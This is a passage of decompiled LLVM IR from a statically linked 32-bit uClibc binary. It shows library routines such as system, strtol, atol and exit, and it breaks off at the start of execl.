  %v3_80543b1 = inttoptr i32 %v2_80543b1 to i32*
  store i32 %v0_80543b1, i32* %v3_80543b1, align 4
  %v0_80543b4 = load i32, i32* @esi, align 4
  %v1_80543b4 = load i32, i32* @edi, align 4
  %v2_80543b4 = add i32 %v1_80543b4, 8
  %v3_80543b4 = inttoptr i32 %v2_80543b4 to i32*
  store i32 %v0_80543b4, i32* %v3_80543b4, align 4
  %v0_80543b7 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_80543bc = sext i32 %arg1 to i64
  %v3_80543bc = call i32 @srandom_r(i64 %v2_80543bc, i32 %v0_80543b7)
  %v0_80543c1 = load i32, i32* @ebp, align 4
  %v1_80543c1 = inttoptr i32 %v0_80543c1 to i32*
  store i32 0, i32* %v1_80543c1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80543cc = load i32, i32* @ebx, align 4
  %v1_80543cc = icmp eq i32 %v0_80543cc, 0
  br i1 %v1_80543cc, label %dec_label_pc_80543fd, label %dec_label_pc_80543d0

dec_label_pc_80543d0:                             ; preds = %dec_label_pc_8054394
  %v0_80543d0 = load i32, i32* @edi, align 4
  %v1_80543d0 = add i32 %v0_80543d0, 4
  %v2_80543d0 = inttoptr i32 %v1_80543d0 to i32*
  %v3_80543d0 = load i32, i32* %v2_80543d0, align 4
  %v1_80543d3 = load i32, i32* @esi, align 4
  %v2_80543d3 = sub i32 %v3_80543d0, %v1_80543d3
  %v2_80543d5 = sdiv i32 %v2_80543d3, 4
  %v3_80543d8 = mul i32 %v2_80543d5, 5
  %v2_80543db = add i32 %v3_80543d8, %v0_80543cc
  %v1_80543dd = load i32, i32* @ebp, align 4
  %v2_80543dd = inttoptr i32 %v1_80543dd to i32*
  store i32 %v2_80543db, i32* %v2_80543dd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80543fd

dec_label_pc_80543e4:                             ; preds = %dec_label_pc_8054383
  %v1_80543e4 = call i32 @__errno_location(i32 %v0_805435d)
  store i32 %v1_80543e4, i32* %eax.global-to-local, align 4
  %v1_80543e9 = inttoptr i32 %v1_80543e4 to i32*
  store i32 22, i32* %v1_80543e9, align 4
  %v0_80543ef = load i32, i32* %stack_var_-36, align 4
  %v1_80543ef = call i32 @__errno_location(i32 %v0_80543ef)
  %v1_80543f4 = inttoptr i32 %v1_80543ef to i32*
  store i32 22, i32* %v1_80543f4, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80543fd

dec_label_pc_80543fd:                             ; preds = %dec_label_pc_8054394, %dec_label_pc_80543d0, %dec_label_pc_80543e4
  %v0_8054404 = phi i32 [ 0, %dec_label_pc_8054394 ], [ 0, %dec_label_pc_80543d0 ], [ -1, %dec_label_pc_80543e4 ]
  ret i32 %v0_8054404

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80543fd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054394, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054408 = load i32, i32* @ebx, align 4
  %v4_8054411 = icmp eq i32 %arg1, 0
  br i1 %v4_8054411, label %dec_label_pc_8054534, label %dec_label_pc_805441c

dec_label_pc_805441c:                             ; preds = %entry
  %v2_8054422 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054431 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054440 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054449 = call i32 @__vfork(i32 %v2_8054440)
  store i32 %v1_8054449, i32* @ebx, align 4
  %v2_8054453 = icmp slt i32 %v1_8054449, 0
  %v2_8054456 = icmp eq i1 %v2_8054453, false
  br i1 %v2_8054456, label %dec_label_pc_8054487, label %dec_label_pc_8054458

dec_label_pc_8054458:                             ; preds = %dec_label_pc_805441c
  %v2_8054460 = call i32 @__bsd_signal(i32 3, i32 %v2_8054422)
  store i32 %v2_8054422, i32* @edx, align 4
  %v2_805446d = call i32 @__bsd_signal(i32 2, i32 %v2_8054431)
  store i32 2, i32* @ebx, align 4
  %v2_805447a = call i32 @__bsd_signal(i32 17, i32 %v2_8054440)
  br label %dec_label_pc_8054531

dec_label_pc_8054487:                             ; preds = %dec_label_pc_805441c
  %v1_8054453 = icmp eq i32 %v1_8054449, 0
  %v1_8054487 = icmp eq i1 %v1_8054453, false
  br i1 %v1_8054487, label %dec_label_pc_80544d3, label %dec_label_pc_8054489

dec_label_pc_8054489:                             ; preds = %dec_label_pc_8054487
  %v2_805448f = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_805449a = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_80544a5 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_80544c4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805c2ab.554 to i32), i32 ptrtoint ([3 x i8]* @global_var_805c2b0.553 to i32), i32 ptrtoint ([3 x i8]* @global_var_805c2a8.552 to i32), i32 %arg1, i32 0)
  %v1_80544ce = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80544d3:                             ; preds = %dec_label_pc_8054487
  %v2_80544d9 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_80544e4 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_80544e9 = ptrtoint i32* %stack_var_-8 to i32
  %v0_80544f2 = load i32, i32* @ebx, align 4
  %v7_80544f3 = call i32 @wait4(i32 %v0_80544f2, i32 %v2_80544e9, i32 0, i32 0)
  %v8_80544fb = icmp eq i32 %v7_80544f3, -1
  %v1_80544fc = icmp eq i1 %v8_80544fb, false
  br i1 %v1_80544fc, label %dec_label_pc_8054506, label %dec_label_pc_80544fe

dec_label_pc_80544fe:                             ; preds = %dec_label_pc_80544d3
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054506

dec_label_pc_8054506:                             ; preds = %dec_label_pc_80544d3, %dec_label_pc_80544fe
  %v2_805450e = call i32 @__bsd_signal(i32 3, i32 %v2_8054422)
  store i32 %v2_8054422, i32* @ebx, align 4
  %v2_805451b = call i32 @__bsd_signal(i32 2, i32 %v2_8054431)
  store i32 %v2_8054431, i32* @edx, align 4
  %v2_8054528 = call i32 @__bsd_signal(i32 17, i32 %v2_8054440)
  %v3_805452d = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054531

dec_label_pc_8054531:                             ; preds = %dec_label_pc_8054458, %dec_label_pc_8054506
  %storemerge = phi i32 [ -1, %dec_label_pc_8054458 ], [ %v3_805452d, %dec_label_pc_8054506 ]
  br label %dec_label_pc_8054534

dec_label_pc_8054534:                             ; preds = %entry, %dec_label_pc_8054531
  %v0_8054538 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8054531 ]
  store i32 %v0_8054408, i32* @ebx, align 4
  ret i32 %v0_8054538

; uselistorder directives
  uselistorder i32 %v1_8054449, { 1, 2, 0 }
  uselistorder i32 %v2_8054440, { 1, 0, 2 }
  uselistorder i32 %v2_8054431, { 0, 2, 1 }
  uselistorder i32 %v2_8054422, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8054534, { 1, 0 }
  uselistorder label %dec_label_pc_8054531, { 1, 0 }
  uselistorder label %dec_label_pc_8054506, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054547 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8054547
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8054561 = inttoptr i32 %arg1 to i8*
  %v5_8054561 = call i32 @_stdlib_strto_l(i8* %v4_8054561, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8054561
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_805456f = load i32, i32* @ebx, align 4
  store i32 %v0_805456f, i32* %stack_var_-16, align 4
  %v0_8054573 = load i32, i32* @global_var_805d1e8, align 8
  %v4_8054579 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054579, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8054579, i32* %ebx.global-to-local, align 4
  %v2_805458641 = load i8, i8* %arg1, align 1
  %v3_805458642 = sext i8 %v2_805458641 to i32
  store i32 %v3_805458642, i32* %eax.global-to-local, align 4
  %v2_805458943 = mul nsw i32 %v3_805458642, 2
  %v3_805458944 = add i32 %v2_805458943, %v0_8054573
  %v4_805458945 = inttoptr i32 %v3_805458944 to i8*
  %v5_805458946 = load i8, i8* %v4_805458945, align 1
  %v6_805458947 = and i8 %v5_805458946, 32
  %v7_805458948 = icmp eq i8 %v6_805458947, 0
  %v1_805458d49 = icmp eq i1 %v7_805458948, false
  br i1 %v1_805458d49, label %dec_label_pc_8054585, label %dec_label_pc_805458f

dec_label_pc_8054585:                             ; preds = %entry, %dec_label_pc_8054585
  %v0_805458550 = phi i32 [ %v1_8054585, %dec_label_pc_8054585 ], [ %v4_8054579, %entry ]
  %v1_8054585 = add i32 %v0_805458550, 1
  store i32 %v1_8054585, i32* %ebx.global-to-local, align 4
  %v1_8054586 = inttoptr i32 %v1_8054585 to i8*
  %v2_8054586 = load i8, i8* %v1_8054586, align 1
  %v3_8054586 = sext i8 %v2_8054586 to i32
  store i32 %v3_8054586, i32* %eax.global-to-local, align 4
  %v2_8054589 = mul nsw i32 %v3_8054586, 2
  %v3_8054589 = add i32 %v2_8054589, %v0_8054573
  %v4_8054589 = inttoptr i32 %v3_8054589 to i8*
  %v5_8054589 = load i8, i8* %v4_8054589, align 1
  %v6_8054589 = and i8 %v5_8054589, 32
  %v7_8054589 = icmp eq i8 %v6_8054589, 0
  %v1_805458d = icmp eq i1 %v7_8054589, false
  br i1 %v1_805458d, label %dec_label_pc_8054585, label %dec_label_pc_805458f

dec_label_pc_805458f:                             ; preds = %dec_label_pc_8054585, %entry
  %v0_8054585.lcssa = phi i32 [ %v4_8054579, %entry ], [ %v1_8054585, %dec_label_pc_8054585 ]
  %v2_8054586.lcssa = phi i8 [ %v2_805458641, %entry ], [ %v2_8054586, %dec_label_pc_8054585 ]
  %v3_8054586.lcssa = phi i32 [ %v3_805458642, %entry ], [ %v3_8054586, %dec_label_pc_8054585 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_805458f = icmp eq i8 %v2_8054586.lcssa, 43
  br i1 %v9_805458f, label %dec_label_pc_80545a4, label %dec_label_pc_8054594

dec_label_pc_8054594:                             ; preds = %dec_label_pc_805458f
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8054596 = icmp eq i8 %v2_8054586.lcssa, 45
  %v1_8054599 = icmp eq i1 %v9_8054596, false
  br i1 %v1_8054599, label %dec_label_pc_80545a5, label %dec_label_pc_80545a4

dec_label_pc_80545a4:                             ; preds = %dec_label_pc_805458f, %dec_label_pc_8054594
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8054594 ], [ 0, %dec_label_pc_805458f ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_80545a4 = add i32 %v0_8054585.lcssa, 1
  store i32 %v1_80545a4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80545a5

dec_label_pc_80545a5:                             ; preds = %dec_label_pc_8054594, %dec_label_pc_80545a4
  %v0_80545b7 = phi i32 [ %v0_8054585.lcssa, %dec_label_pc_8054594 ], [ %v1_80545a4, %dec_label_pc_80545a4 ]
  %v1_80545a7 = and i32 %arg3, -17
  %v2_80545a7 = icmp eq i32 %v1_80545a7, 0
  %v1_80545ad = icmp eq i1 %v2_80545a7, false
  br i1 %v1_80545ad, label %dec_label_pc_80545d3, label %dec_label_pc_80545af

dec_label_pc_80545af:                             ; preds = %dec_label_pc_80545a5
  %v1_80545af = add i32 %arg3, 10
  store i32 %v1_80545af, i32* %esi.global-to-local, align 4
  %v1_80545b2 = inttoptr i32 %v0_80545b7 to i8*
  %v2_80545b2 = load i8, i8* %v1_80545b2, align 1
  %v8_80545b2 = icmp eq i8 %v2_80545b2, 48
  %v1_80545b5 = icmp eq i1 %v8_80545b2, false
  br i1 %v1_80545b5, label %dec_label_pc_80545c9, label %dec_label_pc_80545b7

dec_label_pc_80545b7:                             ; preds = %dec_label_pc_80545af
  %v1_80545b7 = add i32 %v0_80545b7, 1
  store i32 %v1_80545b7, i32* %ebx.global-to-local, align 4
  %v1_80545b8 = add i32 %arg3, 8
  store i32 %v1_80545b8, i32* %esi.global-to-local, align 4
  %v1_80545bd = inttoptr i32 %v1_80545b7 to i8*
  %v2_80545bd = load i8, i8* %v1_80545bd, align 1
  %v3_80545bd = zext i8 %v2_80545bd to i32
  %v5_80545bd = and i32 %v3_8054586.lcssa, -256
  %v6_80545bd = or i32 %v5_80545bd, %v3_80545bd
  %v1_80545bf = or i32 %v6_80545bd, 32
  %v3_80545bf = trunc i32 %v1_80545bf to i8
  store i32 %v1_80545bf, i32* %eax.global-to-local, align 4
  %v10_80545c2 = icmp eq i8 %v3_80545bf, 120
  %v1_80545c4 = icmp eq i1 %v10_80545c2, false
  br i1 %v1_80545c4, label %dec_label_pc_80545c9, label %dec_label_pc_80545c6

dec_label_pc_80545c6:                             ; preds = %dec_label_pc_80545b7
  %v2_80545c6 = mul i32 %v1_80545b8, 2
  store i32 %v2_80545c6, i32* %esi.global-to-local, align 4
  %v1_80545c8 = add i32 %v0_80545b7, 2
  store i32 %v1_80545c8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80545c9

dec_label_pc_80545c9:                             ; preds = %dec_label_pc_80545b7, %dec_label_pc_80545af, %dec_label_pc_80545c6
  %v0_80545f212 = phi i32 [ %v1_80545b7, %dec_label_pc_80545b7 ], [ %v0_80545b7, %dec_label_pc_80545af ], [ %v1_80545c8, %dec_label_pc_80545c6 ]
  %v0_805464920 = phi i32 [ %v1_80545b7, %dec_label_pc_80545b7 ], [ %v4_8054579, %dec_label_pc_80545af ], [ %v1_80545b7, %dec_label_pc_80545c6 ]
  %v0_80545c9 = phi i32 [ %v1_80545b8, %dec_label_pc_80545b7 ], [ %v1_80545af, %dec_label_pc_80545af ], [ %v2_80545c6, %dec_label_pc_80545c6 ]
  %v7_80545cc = icmp sgt i32 %v0_80545c9, 16
  br i1 %v7_80545cc, label %dec_label_pc_80545ce, label %dec_label_pc_80545d3

dec_label_pc_80545ce:                             ; preds = %dec_label_pc_80545c9
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80545d3

dec_label_pc_80545d3:                             ; preds = %dec_label_pc_80545c9, %dec_label_pc_80545a5, %dec_label_pc_80545ce
  %v0_805464921 = phi i32 [ %v0_805464920, %dec_label_pc_80545c9 ], [ %v4_8054579, %dec_label_pc_80545a5 ], [ %v0_805464920, %dec_label_pc_80545ce ]
  %v0_80545f213 = phi i32 [ %v0_80545f212, %dec_label_pc_80545c9 ], [ %v0_80545b7, %dec_label_pc_80545a5 ], [ %v0_80545f212, %dec_label_pc_80545ce ]
  %v0_80545e2 = phi i32 [ %v0_80545c9, %dec_label_pc_80545c9 ], [ %arg3, %dec_label_pc_80545a5 ], [ 16, %dec_label_pc_80545ce ]
  %v1_80545d3 = add i32 %v0_80545e2, -2
  store i32 %v1_80545d3, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_80545db = icmp ugt i32 %v1_80545d3, 34
  br i1 %v6_80545db, label %dec_label_pc_805463e, label %dec_label_pc_80545dd

dec_label_pc_80545dd:                             ; preds = %dec_label_pc_80545d3
  %div = udiv i32 -1, %v0_80545e2
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_80545e2
  %v1_80545e4 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_805461e = urem i32 %arg4, 256
  br label %dec_label_pc_80545f2

dec_label_pc_80545f0:                             ; preds = %dec_label_pc_8054634, %dec_label_pc_805461e
  %v4_80545f2.pre = phi i32 [ %v1_8054608, %dec_label_pc_8054634 ], [ %v4_80545f2.pre.pre, %dec_label_pc_805461e ]
  %v0_80545f0 = phi i32 [ %v1_805460f, %dec_label_pc_8054634 ], [ %v0_80545f0.pre, %dec_label_pc_805461e ]
  br label %dec_label_pc_80545f2

dec_label_pc_80545f2:                             ; preds = %dec_label_pc_80545dd, %dec_label_pc_80545f0
  %v0_805464919 = phi i32 [ %v0_805464921, %dec_label_pc_80545dd ], [ %v0_80545f0, %dec_label_pc_80545f0 ]
  %v0_805460f = phi i32 [ %v0_80545f213, %dec_label_pc_80545dd ], [ %v0_80545f0, %dec_label_pc_80545f0 ]
  %v4_80545f2 = phi i32 [ %div, %dec_label_pc_80545dd ], [ %v4_80545f2.pre, %dec_label_pc_80545f0 ]
  %v1_80545f2 = inttoptr i32 %v0_805460f to i8*
  %v2_80545f2 = load i8, i8* %v1_80545f2, align 1
  %v3_80545f2 = zext i8 %v2_80545f2 to i32
  %v5_80545f2 = and i32 %v4_80545f2, -256
  %v6_80545f2 = or i32 %v3_80545f2, %v5_80545f2
  store i32 %v6_80545f2, i32* %eax.global-to-local, align 4
  %v1_80545f4 = add i32 %v6_80545f2, -48
  store i32 %v1_80545f4, i32* @ecx, align 4
  %v1_80545f7 = trunc i32 %v1_80545f4 to i8
  %tmp55 = icmp ult i8 %v1_80545f7, 10
  br i1 %tmp55, label %dec_label_pc_8054608, label %dec_label_pc_80545fc

dec_label_pc_80545fc:                             ; preds = %dec_label_pc_80545f2
  %v1_80545fc = or i32 %v6_80545f2, 32
  %v3_80545fc = trunc i32 %v1_80545fc to i8
  store i32 %v1_80545fc, i32* %eax.global-to-local, align 4
  %v1_80545ff = and i32 %v1_80545f4, -256
  %v2_80545ff = or i32 %v1_80545ff, 40
  store i32 %v2_80545ff, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_80545fc, 97
  br i1 %tmp56, label %dec_label_pc_8054608, label %dec_label_pc_8054605

dec_label_pc_8054605:                             ; preds = %dec_label_pc_80545fc
  %v1_8054605 = add i32 %v1_80545fc, -87
  store i32 %v1_8054605, i32* @ecx, align 4
  br label %dec_label_pc_8054608

dec_label_pc_8054608:                             ; preds = %dec_label_pc_80545fc, %dec_label_pc_80545f2, %dec_label_pc_8054605
  %v0_8054637 = phi i32 [ %v2_80545ff, %dec_label_pc_80545fc ], [ %v1_80545f4, %dec_label_pc_80545f2 ], [ %v1_8054605, %dec_label_pc_8054605 ]
  %v1_8054608 = urem i32 %v0_8054637, 256
  store i32 %v1_8054608, i32* %eax.global-to-local, align 4
  %v1_805460b = load i32, i32* %esi.global-to-local, align 4
  %v2_805460b = sub i32 %v1_8054608, %v1_805460b
  %v10_805460b = and i32 %v2_805460b, %v1_805460b
  %v11_805460b = icmp slt i32 %v10_805460b, 0
  %v13_805460b = icmp slt i32 %v2_805460b, 0
  %v2_805460d = icmp eq i1 %v13_805460b, %v11_805460b
  br i1 %v2_805460d, label %dec_label_pc_805463e, label %dec_label_pc_805460f

dec_label_pc_805460f:                             ; preds = %dec_label_pc_8054608
  %v1_805460f = add i32 %v0_805460f, 1
  store i32 %v1_805460f, i32* %ebx.global-to-local, align 4
  %v0_8054610 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_8054610, %div
  br i1 %tmp57, label %dec_label_pc_805461e, label %dec_label_pc_8054616

dec_label_pc_8054616:                             ; preds = %dec_label_pc_805460f
  %v15_8054610 = icmp eq i32 %v0_8054610, %div
  %v1_8054616 = icmp eq i1 %v15_8054610, false
  br i1 %v1_8054616, label %dec_label_pc_8054634, label %dec_label_pc_8054618

dec_label_pc_8054618:                             ; preds = %dec_label_pc_8054616
  %v1_8054618 = trunc i32 %v0_8054637 to i8
  %tmp58 = icmp ugt i8 %v1_8054618, %v1_80545e4
  br i1 %tmp58, label %dec_label_pc_805461e, label %dec_label_pc_8054634

dec_label_pc_805461e:                             ; preds = %dec_label_pc_8054618, %dec_label_pc_805460f
  store i32 %v4_805461e, i32* %eax.global-to-local, align 4
  %v0_8054622 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054622 = and i32 %v0_8054622, %v4_805461e
  store i32 %v2_8054622, i32* %ebp.global-to-local, align 4
  %v1_8054624 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8054624, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_805462c = inttoptr i32 %v1_8054624 to i32*
  store i32 34, i32* %v1_805462c, align 4
  %v0_80545f0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_80545f2.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80545f0

dec_label_pc_8054634:                             ; preds = %dec_label_pc_8054618, %dec_label_pc_8054616
  %v4_8054634 = mul i32 %v0_8054610, %v1_805460b
  store i32 %v1_8054608, i32* %eax.global-to-local, align 4
  %v2_805463a = add i32 %v4_8054634, %v1_8054608
  store i32 %v2_805463a, i32* @edx, align 4
  br label %dec_label_pc_80545f0

dec_label_pc_805463e:                             ; preds = %dec_label_pc_8054608, %dec_label_pc_80545d3
  %v0_8054649 = phi i32 [ %v0_805464921, %dec_label_pc_80545d3 ], [ %v0_805464919, %dec_label_pc_8054608 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_80545d3 ], [ %div, %dec_label_pc_8054608 ]
  %v4_805463e = icmp eq i32 %arg2, 0
  br i1 %v4_805463e, label %dec_label_pc_805464b, label %dec_label_pc_8054645

dec_label_pc_8054645:                             ; preds = %dec_label_pc_805463e
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8054649 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8054649, i32* %v2_8054649, align 4
  br label %dec_label_pc_805464b

dec_label_pc_805464b:                             ; preds = %dec_label_pc_805463e, %dec_label_pc_8054645
  %v0_805464b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805464b, i32* %eax.global-to-local, align 4
  %v1_805464d = trunc i32 %v0_805464b to i8
  %v6_805464d = icmp eq i8 %v1_805464d, 0
  %v2_805464f = zext i1 %v6_805464d to i32
  %v1_80546514 = or i32 %v2_805464f, -2147483648
  store i32 %v1_80546514, i32* %ebx.global-to-local, align 4
  %v5_8054657 = icmp eq i8 %tmp37, 0
  br i1 %v5_8054657, label %dec_label_pc_805466f, label %dec_label_pc_805465e

dec_label_pc_805465e:                             ; preds = %dec_label_pc_805464b
  %v0_805465e = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_805465e, %v1_80546514
  br i1 %tmp59, label %dec_label_pc_8054662, label %dec_label_pc_805466f

dec_label_pc_8054662:                             ; preds = %dec_label_pc_805465e
  %v1_8054662 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8054662, i32* %eax.global-to-local, align 4
  %v0_8054667 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054667, i32* @edx, align 4
  %v1_8054669 = inttoptr i32 %v1_8054662 to i32*
  store i32 34, i32* %v1_8054669, align 4
  %v0_805466f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805466f

dec_label_pc_805466f:                             ; preds = %dec_label_pc_805465e, %dec_label_pc_805464b, %dec_label_pc_8054662
  %v0_805466f = phi i32 [ %v0_805464b, %dec_label_pc_805465e ], [ %v0_805464b, %dec_label_pc_805464b ], [ %v0_805466f.pre, %dec_label_pc_8054662 ]
  store i32 %v0_805466f, i32* %eax.global-to-local, align 4
  %v3_8054671 = trunc i32 %v0_805466f to i8
  %v4_8054671 = icmp eq i8 %v3_8054671, 0
  %v0_805467a.pre = load i32, i32* @edx, align 4
  br i1 %v4_8054671, label %dec_label_pc_8054677, label %dec_label_pc_8054675

dec_label_pc_8054675:                             ; preds = %dec_label_pc_805466f
  %v1_8054675 = sub i32 0, %v0_805467a.pre
  store i32 %v1_8054675, i32* @edx, align 4
  br label %dec_label_pc_8054677

dec_label_pc_8054677:                             ; preds = %dec_label_pc_805466f, %dec_label_pc_8054675
  %v0_805467a = phi i32 [ %v1_8054675, %dec_label_pc_8054675 ], [ %v0_805467a.pre, %dec_label_pc_805466f ]
  store i32 %v0_805467a, i32* %eax.global-to-local, align 4
  %v2_805467c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805467c, i32* @ebx, align 4
  ret i32 %v0_805467a

; uselistorder directives
  uselistorder i32 %v0_805467a, { 1, 0 }
  uselistorder i32 %v0_805466f, { 1, 0 }
  uselistorder i32 %v0_8054610, { 0, 2, 1 }
  uselistorder i32 %v1_805460f, { 1, 0 }
  uselistorder i32 %v2_805460b, { 1, 0 }
  uselistorder i32 %v1_8054608, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8054637, { 1, 0 }
  uselistorder i32 %v0_80545f0, { 1, 0 }
  uselistorder i32 %v4_805461e, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_80545e2, { 1, 0, 2 }
  uselistorder i32 %v2_80545c6, { 1, 0 }
  uselistorder i32 %v1_80545bf, { 1, 0 }
  uselistorder i32 %v1_80545b8, { 1, 0, 2 }
  uselistorder i32 %v0_80545b7, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8054586.lcssa, { 1, 0 }
  uselistorder i32 %v0_8054585.lcssa, { 1, 0 }
  uselistorder i32 %v1_8054585, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8054579, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8054573, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054677, { 1, 0 }
  uselistorder label %dec_label_pc_805466f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805464b, { 1, 0 }
  uselistorder label %dec_label_pc_8054608, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545f2, { 1, 0 }
  uselistorder label %dec_label_pc_80545d3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545a5, { 1, 0 }
  uselistorder label %dec_label_pc_80545a4, { 1, 0 }
  uselistorder label %dec_label_pc_8054585, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8054697 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054697, i32* @ebx, align 4
  %v2_805469c = call i32 @__pthread_return_void(i32 %v2_8054697, i32 134564459)
  %v1_80546a8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d420.555 to i32))
  %v0_80546ad = load i32, i32* @global_var_80636c4.556, align 4
  store i32 %v0_80546ad, i32* @eax, align 4
  %v1_80546b5 = icmp eq i32 %v0_80546ad, 0
  br i1 %v1_80546b5, label %dec_label_pc_80546c2, label %dec_label_pc_80546b9

dec_label_pc_80546b9:                             ; preds = %entry
  %v0_80546bc = load i32, i32* @esi, align 4
  %v1_80546bd = call i32 @unknown_0(i32 %v0_80546bc)
  store i32 %v1_80546bd, i32* @eax, align 4
  br label %dec_label_pc_80546c2

dec_label_pc_80546c2:                             ; preds = %entry, %dec_label_pc_80546b9
  %v2_80546c7 = call i32 @__pthread_return_void(i32 %v2_8054697, i32 1)
  %v0_80546cc = call i32 @__GI___uClibc_fini()
  %v0_80546dd = call i32 @_stdio_term()
  %v0_80546e5 = load i32, i32* @esi, align 4
  %v1_80546e6 = call i32 @__GI__exit(i32 %v0_80546e5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 10, 0, 25, 24, 23, 22, 21, 9, 8, 7, 6, 5, 4, 3, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 2 }
  uselistorder label %dec_label_pc_80546c2, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
